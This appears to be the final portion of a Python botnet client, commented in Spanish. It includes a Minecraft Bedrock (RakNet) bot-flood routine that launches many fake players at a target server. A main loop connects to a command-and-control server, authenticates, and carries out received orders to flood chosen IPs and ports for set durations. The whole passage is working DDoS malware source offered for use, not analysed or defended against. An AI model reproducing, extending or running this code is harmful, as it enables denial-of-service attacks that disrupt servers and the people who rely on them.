                bot['_req2flip'] = False
                def send_req2():
                    if bot['phase']!='CONNECTING_2' or bot['is_closing']: return
                    bot['_req2flip'] = not bot['_req2flip']
                    _udp_send(bot, req2)
                    t = threading.Timer(2.0, send_req2); t.daemon=True; t.start(); bot['req2_retry_t']=t
                t = threading.Timer(2.0, send_req2); t.daemon=True; t.start(); bot['req2_retry_t']=t
                continue

            if pid == 0x08 and bot['phase'] == 'CONNECTING_2':
                if bot['req2_retry_t']: bot['req2_retry_t'].cancel(); bot['req2_retry_t'] = None
                bot['phase'] = 'HANDSHAKING'
                _rak_frame(bot, W().u8(0x09).u64be(bot['client_id']).i64be(int(time.time()*1000)).u8(0).buf(), False,0,0,0)
                continue

            if pid == 0x1C and bot['phase'] == 'UNCONNECTED':
                try:
                    r2 = R(msg); r2.skip(1+8+8+16)
                    motd = r2.bytes_(r2.u16be()).decode('utf-8', errors='replace')
                    parts = motd.split(';')
                    if len(parts) >= 3 and parts[2].isdigit():
                        p = int(parts[2])
                        if p > 0: bot['proto'] = p
                except: pass
                if bot['mtu_retry_t']: bot['mtu_retry_t'].cancel(); bot['mtu_retry_t'] = None
                bot['phase'] = 'CONNECTING_1'
                send_request1(bot); schedule_mtu_retry(bot)
                continue

    threading.Thread(target=recv_loop, daemon=True).start()

    ping_count = [0]
    def ping_loop():
        while bot['phase']=='UNCONNECTED' and not bot['is_closing'] and not mcbot_should_stop:
            time.sleep(0.5); ping_count[0] += 1
            if ping_count[0] >= 4:
                if bot['phase']=='UNCONNECTED':
                    bot['proto']=70; bot['phase']='CONNECTING_1'
                    send_request1(bot); schedule_mtu_retry(bot)
                return
            _udp_send(bot, W().u8(0x01).i64be(int(time.time()*1000)).magic().u64be(bot['client_id']).buf())
    threading.Thread(target=ping_loop, daemon=True).start()

    return bot

def start_mcbot_attack(host, port, nombre, cantidad, tiempo, register_cmd, mensajes_raw, intervalo):
    global mcbot_bots, mcbot_should_stop
    
    try:
        cantidad = int(cantidad)
        tiempo = int(tiempo)
        intervalo = int(intervalo)
        mensajes = [m.strip().replace('-', ' ') for m in mensajes_raw.split('|') if m.strip()] if mensajes_raw else ['Hola!']
        
        print(f"[MCBot] Iniciando ataque a {host}:{port}")
        print(f"[MCBot] Bots: {cantidad}, Tiempo: {tiempo}s, Nombre: {nombre}")
        
        for i in range(cantidad):
            if mcbot_should_stop:
                break
            bot = iniciar_mcbot(host, port, nombre, register_cmd, mensajes, intervalo)
            with mcbot_lock:
                mcbot_bots.append(bot)
            time.sleep(0.3)
        
        if tiempo > 0:
            time.sleep(tiempo)
            mcbot_should_stop = True
            with mcbot_lock:
                for bot in mcbot_bots[:]:
                    bot['is_closing'] = True
                    try: bot['sock'].close()
                    except: pass
                mcbot_bots.clear()
            mcbot_should_stop = False
        
        return True
        
    except Exception as e:
        print(f"[MCBot] Error: {e}")
        return False

def stop_mcbot():
    global mcbot_bots, mcbot_should_stop
    mcbot_should_stop = True
    with mcbot_lock:
        for bot in mcbot_bots[:]:
            bot['is_closing'] = True
            try: bot['sock'].close()
            except: pass
        mcbot_bots.clear()

# ─── MAIN ─────────────────────────────────────────────────────────────────────
def main():
    global mcbot_should_stop
    
    while True:
        try:
            c2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            c2.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            c2.settimeout(10)
            
            print(f"[*] Conectando a {C2_ADDRESS}:{C2_PORT}...")
            c2.connect((C2_ADDRESS, C2_PORT))
            print("[+] Conectado!")

            # Autenticación
            auth_step = 0
            while auth_step < 2:
                try:
                    data = c2.recv(1024).decode()
                    if 'Username' in data:
                        c2.send(get_architecture().encode())
                        auth_step = 1
                    elif 'Password' in data and auth_step == 1:
                        c2.send('\xff\xff\xff\xff\75'.encode('cp1252'))
                        auth_step = 2
                except socket.timeout:
                    continue
                except:
                    break
            
            if auth_step < 2:
                raise Exception("Auth failed")
            
            print('✅ Autenticado!')
            
            while True:
                try:
                    data = c2.recv(1024).decode().strip()
                    if not data:
                        continue

                    args = data.split(' ')
                    command = args[0].upper()

                    if command == 'PING':
                        c2.send('PONG'.encode())

                    elif command == 'STOP' and len(args) > 1:
                        username = args[1]
                        stop_attacks(username)
                        if username == 'MCBOT' or 'MCBOT' in username:
                            stop_mcbot()
                            mcbot_should_stop = False

                    elif command == '.MCBOT':
                        if len(args) >= 9:
                            host = args[1]
                            port = int(args[2])
                            nombre = args[3]
                            cantidad = int(args[4])
                            tiempo = int(args[5])
                            register_cmd = args[6]
                            mensajes = args[7]
                            intervalo = int(args[8])
                            
                            mcbot_should_stop = False
                            threading.Thread(target=start_mcbot_attack, args=(host, port, nombre, cantidad, tiempo, register_cmd, mensajes, intervalo), daemon=True).start()

                    else:
                        if len(args) >= 4:
                            method = command
                            ip = args[1]
                            port = int(args[2])
                            secs = int(args[3])
                            threads = int(args[4]) if len(args) >= 5 else 1
                            username = args[5] if len(args) >= 6 else "default"

                            start_attack(method, ip, port, secs, threads, username)
                except socket.timeout:
                    continue
                except:
                    break
                    
            c2.close()
            
        except Exception as e:
            print(f"❌ Error: {e}")
        
        print(f"[*] Reintentando en {RECONNECT_DELAY} segundos...")
        time.sleep(RECONNECT_DELAY)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n🛑 Detenido")
        sys.exit(0)
    except:
        pass
